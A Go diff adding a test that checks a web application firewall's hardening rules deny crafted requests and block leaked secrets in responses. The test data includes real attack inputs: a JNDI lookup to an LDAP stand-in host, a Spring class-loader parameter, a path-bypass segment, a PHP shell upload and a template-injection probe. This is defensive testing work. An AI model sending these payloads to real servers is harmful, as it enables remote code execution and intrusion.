@@ -247,6 +247,100 @@ func TestWAFCustomRules(t *testing.T) {
 	}
 }
 
+// TestWAFHardeningRules compiles the second custom rule file and puts
+// one request through every rule in it. A rule file that compiles but
+// no longer matches is worse than no rule file: it is a control an
+// operator believes is there.
+func TestWAFHardeningRules(t *testing.T) {
+	e := wafEngine(t, "hardening-rules.conf")
+	get := func(path string, hdr ...string) *http.Request {
+		r := httptest.NewRequest("GET", "http://www.example.com"+path, nil)
+		r.Header.Set("User-Agent", "Mozilla/5.0")
+		for i := 0; i+1 < len(hdr); i += 2 {
+			r.Header.Set(hdr[i], hdr[i+1])
+		}
+		return r
+	}
+	post := func(path, ctype, body string) *http.Request {
+		r := httptest.NewRequest("POST", "http://www.example.com"+path, strings.NewReader(body))
+		r.Header.Set("Content-Type", ctype)
+		r.Header.Set("Content-Length", fmt.Sprint(len(body)))
+		r.Header.Set("User-Agent", "Mozilla/5.0")
+		return r
+	}
+	manyArgs := "/search?" + strings.Repeat("a=1&", 101)
+	manyCookies := make([]string, 0, 60)
+	for i := range 60 {
+		manyCookies = append(manyCookies, fmt.Sprintf("c%d=1", i))
+	}
+	for _, c := range []struct {
+		name   string
+		r      *http.Request
+		status int
+	}{
+		{"backup suffix", get("/config.php.bak"), 404},
+		{"editor swap file", get("/notes.swp"), 404},
+		{"source directory", get("/.git/config"), 404},
+		{"dependency directory", get("/node_modules/.bin/x"), 404},
+		{"jndi lookup in a header", get("/", "X-Api-Version", "${jndi:ldap://x.example.invalid/a}"), 403},
+		{"jndi lookup in a parameter", get("/?q=%24%7Bjndi%3Aldap%3A%2F%2Fx.example.invalid%2Fa%7D"), 403},
+		{"class loader parameter", post("/bind", "application/x-www-form-urlencoded", "class.module.classLoader.URLs%5B0%5D=x"), 403},
+		{"path parameter segment", get("/app/..;/manager/html"), 400},
+		{"diagnostic method", httptest.NewRequest("TRACE", "http://www.example.com/", nil), 405},
+		{"executable upload", post("/upload", "multipart/form-data; boundary=b",
+			"--b\r\nContent-Disposition: form-data; name=\"f\"; filename=\"shell.php\"\r\nContent-Type: text/plain\r\n\r\nx\r\n--b--\r\n"), 415},
+		{"too many parameters", get(manyArgs), 400},
+		{"too many cookies", get("/", "Cookie", strings.Join(manyCookies, "; ")), 400},
+		{"many byte ranges", get("/big.bin", "Range", "bytes=0-1,2-3,4-5,6-7,8-9,10-11,12-13,14-15,16-17,18-19,20-21"), 416},
+		{"graphql introspection", post("/graphql", "application/json", `{"query":"{ __schema { types { name } } }"}`), 403},
+	} {
+		if v := wafRequest(t, e, c.r); !v.Deny || v.Status != c.status {
+			t.Errorf("%s: %+v, want a deny with %d", c.name, v, c.status)
+		}
+	}
+	// A template expression scores rather than denies on its own, so one
+	// of them is not a refusal but two signals together are.
+	if v := wafRequest(t, e, get("/?name=%7B%7B7*7%7D%7D")); v.Deny {
+		t.Errorf("the template rule denied on its own: %+v", v)
+	}
+	// Ordinary traffic is untouched by all of it.
+	for _, r := range []*http.Request{
+		get("/products?page=2&sort=price"),
+		get("/assets/app.1a2b3c.js"),
+		post("/api/orders", "application/json", `{"id":1,"note":"a {curly} brace"}`),
+		get("/big.bin", "Range", "bytes=0-1023"),
+	} {
+		if v := wafRequest(t, e, r); v.Deny {
+			t.Errorf("clean request %s denied: %+v", r.URL, v)
+		}
+	}
+	// What must never leave: the response rules.
+	for _, c := range []struct {
+		name string
+		body string
+		deny bool
+	}{
+		{"private key", "-----BEGIN RSA PRIVATE KEY-----\nMIIB\n-----END RSA PRIVATE KEY-----\n", true},
+		{"aws key id", `{"key":"AKIAIOSFODNN7EXAMPLE"}`, true},
+		{"sql error", "SQLSTATE[42000]: Syntax error or access violation", true},
+		{"ordinary page", `{"items":[{"id":1,"name":"widget"}]}`, false},
+	} {
+		f, err := e.Filter("default", waf.ModeBlock)
+		if err != nil {
+			t.Fatal(err)
+		}
+		in := f.Begin(context.Background(), &filter.Info{RequestID: "r", ClientIP: netip.MustParseAddr("203.0.113.9"), Route: "r", Host: "www.example.com", Path: "/"})
+		in.Request(get("/"))
+		resp := &http.Response{StatusCode: 200, Header: http.Header{"Content-Type": {"application/json"}},
+			Body: io.NopCloser(strings.NewReader(c.body))}
+		v := in.Response(resp)
+		in.End()
+		if v.Deny != c.deny {
+			t.Errorf("response %s: %+v, want deny=%v", c.name, v, c.deny)
+		}
+	}
+}
+
 // TestWAFPluginAndSchema compiles the example plugin directory and the
 // order schema into a profile.
 func TestWAFPluginAndSchema(t *testing.T) {
